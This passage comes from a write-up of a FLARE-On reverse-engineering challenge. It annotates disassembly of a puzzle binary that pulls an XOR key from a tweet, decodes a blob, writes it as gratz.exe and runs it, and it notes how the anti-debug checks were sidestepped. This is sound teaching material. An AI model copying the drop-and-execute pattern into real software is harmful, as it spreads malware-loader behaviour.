</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">35
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:004019<span style=color:#268bd2>D6</span> <span style=color:#268bd2>loc_4019D6</span>:
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>D6</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>dwNumberOfBytesRead</span>]
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>DC</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>edx</span>             <span style=color:#586e75>; lpdwNumberOfBytesRead - Pointer to variable that will hold number of bytes read</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>DD</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>1000h</span>           <span style=color:#586e75>; dwNumberOfBytesToRead - Number of bytes to read 0x1000 == 4096</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>E2</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>Buffer</span>]
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>E8</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>             <span style=color:#586e75>; lpBuffer - Buffer to hold the retrieved data</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>E9</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; hFile - Handle from previous InternetOpenUrl call</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>EA</span> <span style=color:#268bd2>call</span>    <span style=color:#b58900>ds</span>:<span style=color:#268bd2>InternetReadFile</span> <span style=color:#586e75>; Reading the first 4KBs of the tweet</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>F0</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>dwNumberOfBytesRead</span>]
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>F6</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>edi</span><span style=color:#719e07>+</span><span style=color:#b58900>edx</span>]
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>F9</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; size_t</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>FA</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>??2@YAPAXI@Z</span>    <span style=color:#586e75>; operator new(uint)</span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>FF</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>edi</span>             <span style=color:#586e75>; size_t</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A00</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>esi</span>, <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A02</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebx</span>             <span style=color:#586e75>; void *</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A03</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>esi</span>             <span style=color:#586e75>; void *</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A04</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_memcpy</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A09</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>dwNumberOfBytesRead</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A0F</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>             <span style=color:#586e75>; size_t</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A10</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>Buffer</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A16</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>edx</span>             <span style=color:#586e75>; void *</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A17</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span><span style=color:#719e07>+</span><span style=color:#b58900>edi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A1A</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>             <span style=color:#586e75>; void *</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A1B</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_memcpy</span>         <span style=color:#586e75>; Copy retrieved data to [eax]</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A20</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ebx</span>             <span style=color:#586e75>; void *</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A21</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>??3@YAXPAX@Z</span>    <span style=color:#586e75>; operator delete(void *)</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A26</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>dwNumberOfBytesRead</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A2C</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>esp</span>, <span style=color:#2aa198>20h</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A2F</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>edi</span>, <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A31</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ebx</span>, <span style=color:#b58900>esi</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A33</span> <span style=color:#268bd2>test</span>    <span style=color:#b58900>eax</span>, <span style=color:#b58900>eax</span>         <span style=color:#586e75>; Keep reading until NumberofBytesRead is zero</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>A35</span> <span style=color:#268bd2>jnz</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_4019D0</span> <span style=color:#586e75>; if (NumberofBytesRead !=0 ) jump to loc_4019D0 to continue reading</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>D0</span> <span style=color:#268bd2>loc_4019D0</span>:
</span></span><span style=display:flex><span>.text:004019<span style=color:#268bd2>D0</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>hInternet</span>] <span style=color:#586e75>; Back to the top to continue reading</span></span></span></code></pre></td></tr></table></div></div></div></figure><p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385103%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">InternetReadFile</a> retrieves the tweet. A buffer is created to hold the retrieved data. Documentation says "[a] normal read retrieves the specified dwNumberOfBytesToRead for each call to InternetReadFile until the end of the file is reached. To ensure all data is retrieved, an application must continue to call the InternetReadFile function until the function returns TRUE and the lpdwNumberOfBytesRead parameter equals zero." This is happening in lines 31-35. We keep reading until <code>NumberofBytesRead</code> is zero.</p><p>After we are done, the jump in line 32 is not taken and we land here:</p><p><img src=/images/2014/flare/7-21.jpg alt="Sifting through the tweet" title="Sifting through the tweet"></p><p>We retrieved the tweet. Now <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/bb773436%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">strstr</a> is called to find the first instance of <code>Secluded Hi</code> in the tweet. The return value is a pointer to the start of <code>Secluded HijackRAT http://t.co/ckx18JHdkb ...</code>. The application adds <code>0x0B</code> or 11 to the start of the string to skip <code>Secluded Hi</code> and point to <code>jackRAT http://t.co/ckx18JHdkb ...</code>. A new 8 character buffer is created and passed to <a href=http://msdn.microsoft.com/en-us/library/xdsywd25.aspx target=_blank rel="noreferrer noopener">strncpy</a>. <code>strncpy</code> is called to copy 7 bytes from the start to the newly created buffer which will be <code>jackRAT</code>. The rest is simple, <code>jackRAT</code> is xor-ed with the blob and finally <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa384350%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">InternetCloseHandle</a> is called three times to close the three function calls.</p><p>![xor(blob,"jackRAT")](/images/2014/flare/7-22.jpg "xor(blob,"jackRAT")</p><figure class=code><figcaption><span>jackRAT xor</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;jackRAT&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h3 id=are-we-there-yet-gratz-but-not-yet>Are we there yet? gratz but not yet
<a class=header-link href=#are-we-there-yet-gratz-but-not-yet><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">38
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B83</span> <span style=color:#268bd2>loc_401B83</span>:                             <span style=color:#586e75>; CODE XREF: .text:00401B58j</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B83</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>InternetRootz</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B88</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>jackRAT</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B8D</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>esi</span><span style=color:#719e07>+</span><span style=color:#2aa198>4</span>]          <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B90</span> <span style=color:#268bd2>movzx</span>   <span style=color:#b58900>edx</span>, <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ecx</span>]   <span style=color:#586e75>; application crashes here if no arguments are provided</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B93</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>bl</span><span style=color:#268bd2>ob</span>, <span style=color:#b58900>dl</span>              <span style=color:#586e75>; blob[0] = arg1[0]; first character of arg1 written to blob</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B99</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span><span style=color:#719e07>+</span><span style=color:#2aa198>4</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B9C</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>cl</span>, [<span style=color:#b58900>eax</span><span style=color:#719e07>+</span><span style=color:#2aa198>1</span>]           <span style=color:#586e75>; cl = arg1[1]; second character of arg1</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B9F</span> <span style=color:#268bd2>mov</span>     <span style=color:#dc322f>byte</span><span style=color:#268bd2>_4131F9</span>, <span style=color:#b58900>cl</span>       <span style=color:#586e75>; blob[1] = arg1[1];</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BA5</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>esi</span><span style=color:#719e07>+</span><span style=color:#2aa198>8</span>]          <span style=color:#586e75>; edx = *(arg2);</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BA8</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>al</span>, [<span style=color:#b58900>edx</span>]             <span style=color:#586e75>; al = arg2[0];</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BAA</span> <span style=color:#268bd2>mov</span>     <span style=color:#dc322f>byte</span><span style=color:#268bd2>_413278</span>, <span style=color:#b58900>al</span>       <span style=color:#586e75>; blob[0x80] = arg2[0]; 413278 - 413F9 = 0x7F</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BAF</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>esi</span><span style=color:#719e07>+</span><span style=color:#2aa198>8</span>]          <span style=color:#586e75>; ecx = *(arg2);</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BB2</span> <span style=color:#268bd2>movzx</span>   <span style=color:#b58900>edx</span>, <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ecx</span><span style=color:#719e07>+</span><span style=color:#2aa198>1</span>] <span style=color:#586e75>; edx = arg2[1];</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BB6</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>-</span><span style=color:#2aa198>10h</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BB9</span> <span style=color:#268bd2>push</span>    <span style=color:#268bd2>offset</span> <span style=color:#268bd2>aWb</span>            <span style=color:#586e75>; mode: &#34;wb&#34; - write in binary mode</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BBE</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>eax</span>                   <span style=color:#586e75>; push current path</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BBF</span> <span style=color:#268bd2>mov</span>     <span style=color:#dc322f>byte</span><span style=color:#268bd2>_413279</span>, <span style=color:#b58900>dl</span>       <span style=color:#586e75>; blob[0x81] = arg2[1];</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BC5</span> <span style=color:#268bd2>mov</span>     <span style=color:#dc322f>dword</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ebp</span><span style=color:#719e07>-</span><span style=color:#2aa198>10h</span>], <span style=color:#2aa198>74617267h</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BCC</span> <span style=color:#268bd2>mov</span>     <span style=color:#dc322f>dword</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ebp</span><span style=color:#719e07>-</span><span style=color:#2aa198>0Ch</span>], <span style=color:#2aa198>78652E7Ah</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BD3</span> <span style=color:#268bd2>mov</span>     <span style=color:#dc322f>word</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ebp</span><span style=color:#719e07>-</span><span style=color:#2aa198>8</span>], <span style=color:#2aa198>65h</span> <span style=color:#586e75>; &#34;gratz.exe&#34; saved in [ebp-10]</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BD9</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_fopen</span>                <span style=color:#586e75>; fopen(filename=&#34;currentpath\gratz.exe&#34;,mode=&#34;wb&#34;); Open if exists and if not create it</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BDE</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, <span style=color:#b58900>bl</span><span style=color:#268bd2>ob_length</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BE4</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>esi</span>, <span style=color:#b58900>eax</span>              <span style=color:#586e75>; *(gratz.exe)</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BE6</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>esi</span>                   <span style=color:#586e75>; FILE = *(gratz.exe)</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BE7</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>ecx</span>                   <span style=color:#586e75>; size = blob length</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BE8</span> <span style=color:#268bd2>push</span>    <span style=color:#2aa198>1</span>                     <span style=color:#586e75>; count = 1</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BEA</span> <span style=color:#268bd2>push</span>    <span style=color:#268bd2>offset</span> <span style=color:#b58900>bl</span><span style=color:#268bd2>ob</span>           <span style=color:#586e75>; buffer = *(blob)</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BEF</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_fwrite</span>               <span style=color:#586e75>; fwrite( *(blob), 1, blob_length, *(gratz.exe) ); Write blob to gratz.exe</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BF4</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>esi</span>                   <span style=color:#586e75>; push *(gratz.exe)</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BF5</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_fclose</span>               <span style=color:#586e75>; fclose( *(gratz.exe) ); Close gratz.exe</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BFA</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>edx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>-</span><span style=color:#2aa198>10h</span>]        <span style=color:#586e75>; edx = &#34;gratz.exe&#34;</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BFD</span> <span style=color:#268bd2>push</span>    <span style=color:#b58900>edx</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>BFE</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>_system</span>               <span style=color:#586e75>; system(&#34;gratz.exe&#34;); Execute gratz.exe</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>C03</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>ebp</span><span style=color:#719e07>-</span><span style=color:#2aa198>4</span>]</span></span></code></pre></td></tr></table></div></div></div></figure><p>The application crashed in line 5 over and over again. When I looked inside ecx I saw empty space but looking around I saw the application's complete path. After a while I realized that the code is trying to read arguments. The rest is obvious from the code. First two characters of first argument are written over the first two characters of the blob. First and second characters of second argument are written at offset <code>0x80</code> and <code>0x81</code>.</p><p>Then <a href=http://msdn.microsoft.com/en-us/library/yeby3zcb.aspx target=_blank rel="noreferrer noopener">fopen</a> is called to create/open a file named <code>gratz.exe</code> for writing in binary mode ("wb"). Then blob is written to it by calling <a href=http://msdn.microsoft.com/en-us/library/h9t88zwz.aspx target=_blank rel="noreferrer noopener">fwrite</a> and finally it is closed with <a href=http://msdn.microsoft.com/en-us/library/fxfsw25t.aspx target=_blank rel="noreferrer noopener">fclose</a>. Then command <code>gratz.exe</code> is run via the <a href=http://msdn.microsoft.com/en-us/library/277bwbdz.aspx target=_blank rel="noreferrer noopener">system</a> call. So we are writing the blob to a file and then executing it.</p><p>What is special about first two bytes in a Windows binary? It's the start of the DOS stub with the magic bytes <code>MZ</code> and you have already guessed that the second argument should be <code>PE</code>.</p><h3 id=how-do-i-xor>How do I XOR?
<a class=header-link href=#how-do-i-xor><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>But how do we get the correct binary. As we have already seen, there are a series of checks and depending on the checks, different strings are xor-ed with the original blob. A correct sequence of strings will produce a correct binary. The path is probably known at this point, just bypass any Anti-VM/Anti-Debug countermeasures and other checks. But I am lazy and instead wrote a bruteforcer. In order for the bruteforcer to work, we need the original blob before any xors. That is easy. Set a breakpoint before any of the functions. Then set the Instruction Pointer to <code>00401B8D</code> and step through after the breakpoint. Stop before the <code>system</code> call and copy the <code>gratz.exe</code> file from disk.</p><p>Here's my bruteforcer. This is not good code but at that point I just wanted to finish.</p><figure class=code><figcaption><span>bruteforcer</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 20
